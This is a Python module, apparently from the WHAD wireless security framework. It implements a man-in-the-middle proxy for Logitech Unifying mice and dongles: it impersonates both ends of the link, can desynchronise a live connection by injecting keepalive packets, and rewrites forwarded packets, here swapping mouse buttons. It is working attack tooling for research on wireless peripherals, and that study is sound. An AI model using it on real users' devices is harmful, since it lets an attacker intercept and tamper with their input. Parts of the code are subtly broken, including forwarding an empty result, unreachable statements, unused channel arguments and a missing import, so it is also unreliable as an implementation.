"""This module provides specific classes to set-up a Unifying proxy.

The class :class:`LinkLayerProxy` provides a link-layer level Unifying proxy that
implements different mechanisms to setup a Man-in-the-Middle in an Unifying network.

Once established, the class will act as a proxy, allowing to block, modify or formward
packets transmitted to the dongle.
"""
from whad.unifying.connector import Unifying, Mouse, Dongle
from whad.esb.stack import ESBStack
from whad.unifying.stack import UnifyingApplicativeLayer, UnifyingRole
from whad.scapy.layers.esb import ESB_Hdr, ESB_Payload_Hdr
from whad.scapy.layers.unifying import Logitech_Unifying_Hdr, Logitech_Keepalive_Payload, \
    Logitech_Set_Keepalive_Payload
from random import choice
from enum import IntEnum
from time import sleep
# Logging
import logging
logger = logging.getLogger(__name__)

def pick_random_unifying_channel():
    """
    Returns a randomly chosen Unifying channel.
    """
    channels = [5, 8, 11, 14, 17, 20, 29, 32, 35, 38, 41, 44, 47, 56, 59, 62, 65, 68, 71, 74]
    return choice(channels)


class LowLevelDongle(Dongle):
    """Link-layer only PDU implementation

    This class is used by the :class:`whad.unifying.tools.proxy.LinkLayerProxy` class
    to provide a Link-Layer dongle.
    """

    def __init__(self, device, proxy=None):
        super().__init__(device)
        self.__proxy = proxy
        self.__other_half = None

    def set_other_half(self, other_half):
        self.__other_half = other_half


    def on_pdu(self, packet):
        print("[dongle] received PDU: " + repr(packet) +("(channel = %d)" % packet.metadata.channel))

        # Apply potential modifications from proxy and forward to other half
        if self.__other_half is not None:
            if self.__proxy is not None:
                pdu = self.__proxy.on_pdu(packet)

                if pdu is not None:
                    self.__other_half.forward_pdu(pdu)
                else:
                    self.__other_half.forward_pdu(pdu)
        super().on_pdu(packet)

    def forward_pdu(self, pdu):
        """Forward a PDU to the node, if any

        :param Packet pdu: PDU to send to the node
        """
        try:
            payload = pdu[Logitech_Unifying_Hdr:][1:]
            return self.stack.app.prepare_message(payload)
        except IndexError:
            return False

class LowLevelNode(Mouse):
    """Link-layer only Node implementation

    This class is used by the :class:`whad.unifying.tools.proxy.LinkLayerProxy` class
    to provide a Link-Layer node.

    """
    def __init__(self, device, proxy=None):
        super().__init__(device)
        self.__proxy = proxy
        self.__other_half = None

    def set_other_half(self, other_half):
        self.__other_half = other_half

    def on_pdu(self, packet):

        # We don't forward packet if it is a acknowledgment with an empty payload
        # because the other half will automatically acknowledge packets
        super().on_pdu(packet)

        if len(bytes(packet[ESB_Payload_Hdr:])) == 0:
            self.__proxy.on_ack()
            return

        print("[node] received packet " + repr(packet)  +("(channel = %d)" % packet.metadata.channel))

        # Apply potential modifications from proxy and forward to other half
        if self.__other_half is not None:
            if self.__proxy is not None:
                pdu = self.__proxy.on_pdu(packet)
                if pdu is not None:
                    self.__other_half.forward_pdu(pdu)
                else:
                    self.__other_half.forward_pdu(pdu)

    def forward_pdu(self, pdu):
        """Forward a PDU to the dongle, if any

        :param Packet pdu: PDU to send to the dongle
        """
        try:
            payload = pdu[Logitech_Unifying_Hdr:][1:]
            payload.show()
            return self.stack.app.prepare_message(payload)
            self.send(pdu)

        except IndexError:
            return False


class LinkLayerProxy(object):
    """This class implements a Unifying proxy that relies on two Unifying-compatible
    WHAD devices to create a real Unifying device that will proxify all the link-layer
    traffic to another device.

    By default, it will imitate the behaviour of a dongle on a first Unifying channel and
    the behaviour of a Mouse / Keyboard on a second channel.
    """

    def __init__(self, proxy=None, target=None, address=None, desync=False, proxy_channel=None, target_channel=None):
        """
        :param Unifying proxy: Unifying device to use as dongle
        :param Unifying target: Unifying device to use as node
        :param str address: Unifying address of target device
        :param bool desync: desynchronize an existing connection
        :param int proxy_channel: proxy channel to use
        :param int target_channel: target channel to use
        """
        if proxy is None or target is None or address is None:
            raise WhadDeviceNotFound

        # Save both devices
        self.__proxy = proxy
        self.__dongle = None
        self.__target = target
        self.__node = None
        self.__target_addr = address
        self.__proxy_channel = None
        self.__target_channel = None

        self.__desync = desync

        self.__ack_counter = 0
        # Callbacks
        self.__callbacks = []

    @property
    def target(self):
        return self.__node


    @property
    def proxy(self):
        return self.__dongle



    def close(self):
        if self.__proxy is not None:
            self.__proxy.close()
        if self.__target is not None:
            self.__target.close()


    def on_ack(self):
        self.__ack_counter += 1

    def on_pdu(self, pdu):

        if hasattr(pdu, "button_mask"):
            if pdu.button_mask == 0x01:
                pdu.button_mask = 2
            elif pdu.button_mask == 0x02:
                pdu.button_mask = 1
        return pdu

    def start(self):
        """Start proxy

        The proxy device will be set as a dongle
        """

        # First, connect our central device to our target device
        print('create low-level dongle device ...')
        self.__dongle = LowLevelDongle(self.__proxy, self)

        # If proxy channel is provided, use it, otherwise pick one Unifying channel randomly
        if self.__proxy_channel is not None:
            self.__dongle.channel = self.__proxy_channel
        else:
            self.__dongle.channel = pick_random_unifying_channel()

        self.__dongle.address = self.__target_addr

        print('create low-level node device ...')
        self.__node = LowLevelNode(self.__target, self)

        # If target channel is provided, use it, otherwise pick one Unifying channel randomly
        if self.__target_channel is not None:
            self.__node.channel = self.__target_channel
        else:
            self.__node.channel = pick_random_unifying_channel()

        self.__node.address = self.__target_addr


        self.__node.set_other_half(self.__dongle)
        self.__dongle.set_other_half(self.__node)

        if self.__desync:
            self.desync()
        else:
            # Start the node, lock the channel
            self.__node.start()
            self.__node.lock()

            # Start the dongle
            self.__dongle.start()



    def desync(self):
        self.__node.start()
        self.__dongle.start()

        while True:
            print("Synchronizing ...")
            #self.__node.start()
            while not self.__node.synchronize():
                sleep(0.1)
            self.__dongle.channel = self.__node.channel
            while self.__node.channel == self.__dongle.channel:
                self.__node.channel = pick_random_unifying_channel()
            #self.__node.stop()

            self.__node.lock()
            #self.__node.start()
            #self.__dongle.start()
            self.__ack_counter = 0
            self.__dongle.auto(False)
            print("Injecting keepalive...")
            self.__dongle.send(ESB_Hdr()/ESB_Payload_Hdr()/Logitech_Unifying_Hdr()/Logitech_Set_Keepalive_Payload(timeout=1))
            self.__dongle.send(ESB_Hdr()/ESB_Payload_Hdr()/Logitech_Unifying_Hdr()/Logitech_Keepalive_Payload(timeout=1))
            self.__dongle.auto(True)
            sleep(5)
            if self.__ack_counter > 5:
                return True

            self.__node.unlock()
            #self.__node.stop()
            #self.__dongle.stop()

    def stop(self):
        """
        Stop the proxy.
        """
        if self.__dongle is not None:
            self.__dongle.stop()
        if self.__node is not None:
            self.__node.stop()
